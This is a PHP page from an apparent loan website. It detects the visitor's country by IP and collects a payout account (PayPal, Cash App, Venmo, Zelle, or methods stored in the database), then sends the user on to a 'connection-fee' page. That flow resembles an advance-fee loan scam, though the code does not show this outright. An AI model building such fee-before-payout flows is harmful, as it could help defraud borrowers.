<?php
session_start();
require '../config/db.php';
require 'includes/countries.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: ../login.php");
    exit();
}

/* -----------------------------
   GEO DETECTION
------------------------------*/
$ip = $_SERVER['REMOTE_ADDR'];
$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));

$country = $geo->country ?? 'Unknown';
$isUSA = ($country === "United States");

$_SESSION['country'] = $country;

/* -----------------------------
   TYPE DECISION
------------------------------*/
$type = $isUSA ? 'usa' : 'fallback';

/* -----------------------------
   PAYMENT METHODS (fallback only)
------------------------------*/
$paymentMethods = [];

if ($type === 'fallback') {

    $stmt = $conn->prepare("
        SELECT *
        FROM payment_methods
        WHERE country = ?
        ORDER BY type
    ");

    $stmt->bind_param("s", $country);
    $stmt->execute();
    $result = $stmt->get_result();

    while ($row = $result->fetch_assoc()) {
        $paymentMethods[] = $row;
    }

    $stmt->close();

    // fallback to Global
    if (empty($paymentMethods)) {

        $stmt = $conn->prepare("
            SELECT *
            FROM payment_methods
            WHERE country = 'Global'
            ORDER BY type
        ");

        $stmt->execute();
        $result = $stmt->get_result();

        while ($row = $result->fetch_assoc()) {
            $paymentMethods[] = $row;
        }

        $stmt->close();
    }
}

include 'includes/header.php';
include 'includes/navbar.php';
?>

<div class="container">

    <div class="loan-form">

        <h2 style="text-align:center;margin-bottom:20px;">
            Link Withdrawal Method
        </h2>

        <!-- SHOW DETECTED COUNTRY -->
        <div style="padding:15px;background:#f8fbff;border-left:5px solid var(--accent);border-radius:10px;margin-bottom:20px;">
            <strong>Detected Country:</strong>
            <?= htmlspecialchars($country) ?>
        </div>

        <?php if ($type === 'usa'): ?>

            <p>Select your US payment method:</p>

            <form method="POST" action="connection-fee.php">

                <input type="hidden" name="type" value="usa">
                <input type="hidden" name="country" value="United States">

                <div class="form-group">
                    <label>Payment Method</label>
                    <select name="method" required>
                        <option value="paypal">PayPal</option>
                        <option value="cashapp">Cash App</option>
                        <option value="venmo">Venmo</option>
                        <option value="zelle">Zelle</option>
                    </select>
                </div>

                <div class="form-group">
                    <label>Account Identifier</label>
                    <input type="text" name="account" required placeholder="Email / Username / Phone">
                </div>

                <button type="submit" class="submit-btn">Continue</button>

            </form>

        <?php else: ?>

            <p>Choose your preferred withdrawal method:</p>

            <?php if (!empty($paymentMethods)): ?>

                <form method="POST" action="connection-fee.php">

                    <input type="hidden" name="type" value="fallback">
                    <input type="hidden" name="country" value="<?= htmlspecialchars($country) ?>">
                    <input type="hidden" name="selected_type" id="selected_type">

                    <div class="form-group">
                        <label>Payment Method</label>

                        <select name="payment_type" id="payment_type" required>
                            <option value="">Select Payment Method</option>

                            <?php foreach ($paymentMethods as $index => $method): ?>
                                <option value="<?= $index ?>">
                                    <?= match ($method['type']) {
                                        'bank' => 'Bank',
                                        'momo' => 'MOMO',
                                        'crypto' => 'Crypto',
                                        default => ucfirst($method['type'])
                                    } ?>
                                </option>
                            <?php endforeach; ?>

                        </select>
                    </div>

                    <div id="paymentFields" style="display:none;">

                        <div class="form-group">
                            <label id="label_method"></label>
                            <input type="text" name="method" id="field_method">
                        </div>

                        <div class="form-group">
                            <label id="label_method_name"></label>
                            <input type="text" name="method_name" id="field_method_name">
                        </div>

                        <div class="form-group">
                            <label id="label_method_id"></label>
                            <input type="text" name="method_id" id="field_method_id">
                        </div>

                        <button type="submit" class="submit-btn">
                            Continue
                        </button>

                    </div>

                </form>

                <script>
                const paymentMethods = <?= json_encode($paymentMethods) ?>;

                document.getElementById('payment_type').addEventListener('change', function () {

                    const index = this.value;

                    if (index === '') {
                        document.getElementById('paymentFields').style.display = 'none';
                        document.getElementById('selected_type').value = '';
                        return;
                    }

                    const selected = paymentMethods[index];

                    document.getElementById('selected_type').value = selected.type;

                    document.getElementById('paymentFields').style.display = 'block';

                    document.getElementById('label_method').innerText = selected.method;
                    document.getElementById('label_method_name').innerText = selected.method_name;
                    document.getElementById('label_method_id').innerText = selected.method_id;

                    document.getElementById('field_method').placeholder = 'Enter ' + selected.method;
                    document.getElementById('field_method_name').placeholder = 'Enter ' + selected.method_name;
                    document.getElementById('field_method_id').placeholder = 'Enter ' + selected.method_id;
                });
                </script>

            <?php else: ?>

                <div class="alert-error">
                    No payment methods configured for <?= htmlspecialchars($country) ?>.
                </div>

            <?php endif; ?>

        <?php endif; ?>

    </div>

</div>

<?php include 'includes/footer.php'; ?>
